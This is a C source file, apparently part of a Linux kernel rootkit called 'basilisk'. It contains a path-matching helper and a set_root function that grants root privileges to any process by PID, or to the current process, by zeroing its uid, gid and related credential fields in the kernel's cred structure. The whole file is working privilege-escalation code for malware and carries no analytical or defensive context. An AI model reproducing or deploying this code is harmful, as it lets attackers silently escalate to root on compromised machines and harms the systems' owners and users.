#include "include/utils.h"

/* Checks if path matches target */
bool is_bad_path(const char *full_path, const char *target, size_t n) {
  size_t fp_len;
  size_t t_len;
  if (!full_path || !target) {
    return true; // pointer is NULL
  }
  // simple bounds checking
  fp_len = strlen(full_path);
  t_len = strlen(target);

  if (n > fp_len || n > t_len) {
    return true;
  }

  return strncmp(full_path, target, n) != 0;
}

/* Set given credentials to root (does not commit creds for you!) */
static void __set_root_creds(struct cred *creds)
{
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
}

/* Wrapper for __set_root_creds */
void set_root(pid_t pid) {
  struct pid *pid_struct;
  struct task_struct *task;
  struct cred *task_cred;

  pr_info("basilisk: giving root . . .\n");
  if (pid) {
    // Set credentials of process from PID
    pid_struct = find_get_pid(pid);
    task = pid_task(pid_struct, PIDTYPE_PID);
    if (task) {
      task_lock(task);

      task_cred = task->cred;
      __set_root_creds(task_cred);

      task_unlock(task);
      put_pid(pid_struct);
    }

  } else {
    task_cred = prepare_creds();
    if (!task_cred) {
      return;
    }
    __set_root_creds(task_cred);
    // Set credentials of current process
    commit_creds(task_cred);
  }
}
